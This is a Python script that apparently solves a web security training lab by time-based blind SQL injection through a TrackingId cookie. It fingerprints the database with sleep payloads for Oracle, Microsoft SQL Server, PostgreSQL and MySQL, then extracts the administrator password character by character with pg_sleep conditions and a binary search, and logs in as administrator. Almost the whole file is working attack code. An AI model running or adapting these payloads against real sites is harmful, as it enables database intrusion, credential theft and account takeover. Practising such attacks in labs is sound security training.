import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    login_url = url + path
    r = s.get(login_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, username, password):
    login_url = url + '/login'
    payload = {
        "csrf": get_csrf_token(s, url, '/login'),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)

    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def detect_database(s, url, path, delay):
    target_url = url + path
    base_id = s.cookies.get('TrackingId') or ""
    print("[+] Detecting Database Type...")
    
    db_payloads = [
        ("Oracle", f"' AND 1=(SELECT dbms_pipe.receive_message('a',{delay}) FROM dual)--", delay),
        ("Microsoft", f"' WAITFOR DELAY '0:0:{delay}'--", delay),
        ("PostgreSQL", f"'||pg_sleep({delay})--", delay),
        ("MySQL", f"' AND SLEEP({delay})--%20", delay)
    ]

    for db_name, payload, delay in db_payloads:
        print(f"[*] Testing for {db_name}...")
        
        start_time = time.time()
        try:
            # allow_redirects=False to avoid additional time delay
            s.get(target_url, cookies={"TrackingId": base_id + payload}, allow_redirects=False, timeout=delay * 2)
            end_time = time.time()
            
            elapsed = end_time - start_time
            if elapsed >= delay:
                print(f"[+] Database detected: {db_name} (Response time: {elapsed:.2f}s)")
                return db_name
        except requests.exceptions.Timeout:
            print(f"[+] Database detected: {db_name} (Caused Timeout > {delay * 2}s)")
            return db_name
        except Exception as e:
            print(f"[!] Error testing {db_name}: {e}")
            
    print("[-] Could not detect database type.")
    return None

def _check_length_pass(s, url, path, username, base_id, delay):
    target_url = url + path
    for i in range(0, 30):
        try:
            sql_injection = f"LENGTH(password)={i}"
            full_sql = f"'|| (SELECT CASE WHEN ({sql_injection}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users WHERE username='{username}')--"
            cookies = { "TrackingId": base_id + full_sql }
            start = time.time()
            r = s.get(target_url, cookies=cookies, allow_redirects=False, timeout=delay)
            end = time.time()
            print(f'[..] Is length password equal {i}')
            if end - start >= delay:
                return i
        except requests.exceptions.Timeout:
            return i
    return None

def _try(s, url, path, username, idx, c, base_id, delay):
    try:
        target_url = url + path
        sql_injection = f"(ASCII(SUBSTRING(password, {idx}, 1)) >= {c})"
        full_sql = f"'|| (SELECT CASE WHEN {sql_injection} THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users WHERE username='{username}')--"
        cookies = { "TrackingId": base_id + full_sql }
        start = time.time()
        r = s.get(target_url, cookies=cookies, allow_redirects=False, timeout=delay)
        end = time.time()
        if end - start >= delay:
            return True
        return False
    except requests.exceptions.Timeout:
        return True

def bruteforce(s, url, path, username, delay):
    base_id = s.cookies.get('TrackingId')
    if not base_id:
        print("[-] Error: Could not find 'TrackingId' in cookies.")
        sys.exit(-1)
    len_pass = _check_length_pass(s, url, path, username, base_id, delay)
    if not len_pass:
        print('[-] Fail to get length of password')
        sys.exit(-1)
    else:
        print(f'[+] Password length equal {len_pass}')

    print('[+] Start bruteforce:')
    password = ""
    for i in range(1, len_pass + 1):
        l, r = 0, 256
        correct_char = ''
        flag = False

        while l <= r:
            mid = (l + r) // 2
            if _try(s, url, path, username, i, mid, base_id, delay):
                correct_char = chr(mid)
                flag = True
                l = mid + 1
            else:
                r = mid - 1

        if flag:
            password += correct_char
        else:
            print(f'[-] Fail to find character in index {i}')
            sys.exit(-1)
        print(f'[..] Processing i = {i}: {password}')
    
    print('[+] Finished')
    print(f"[+] Found password = {password}")
    return password

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    s.get(url)
    print(detect_database(s, url, '/login', 5))
    password = bruteforce(s, url, '/login', 'administrator', 5)
    login_acc(s, url, 'administrator', password)
    check_solved_lab(s, url)


if __name__ == '__main__':
    main()